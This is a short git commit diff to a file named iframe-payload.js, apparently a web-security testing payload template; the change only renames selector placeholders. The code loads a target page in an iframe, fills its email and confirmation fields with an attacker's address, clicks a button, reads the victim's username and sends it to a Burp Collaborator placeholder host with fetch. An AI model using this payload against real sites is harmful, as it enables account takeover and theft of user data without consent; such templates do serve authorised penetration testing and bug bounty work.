33dfe5f8f7649690424de2bea6324aefb8da3e10
Joe Mardell <149815610+JoeMardell@users.noreply.github.com>
2024-02-08 20:18:36 +0000

    Update iframe-payload.js

--- iframe-payload.js
+++ iframe-payload.js
@@ -9,10 +9,10 @@ function buildFrame() {
     setTimeout(function(){
         frame.contentDocument.getElementById("EmailAddress").value="<YOUR-EMAIL>"
         frame.contentDocument.getElementById("EmailAddressConfirm").value="<YOUR-EMAIL>"
-        frame.contentDocument.querySelector("<TARGET-ELEMENT-ID-FOR-BUTTON>").click()
+        frame.contentDocument.querySelector("<TARGET-ELEMENTID/CLASS-FOR-BUTTON>").click()
     }, 2000)
     setTimeout(function(){
-        let userName=frame.contentDocument.querySelector("<TARGET-ELEMENT-ID-FOR-USERNAME>").textContent
+        let userName=frame.contentDocument.querySelector("<TARGET-ELEMENTID/CLASS-FOR-USERNAME>").textContent
         fetch('<BURP-COLLABORATOR>/?x='+userName)
     }, 5000)
 }
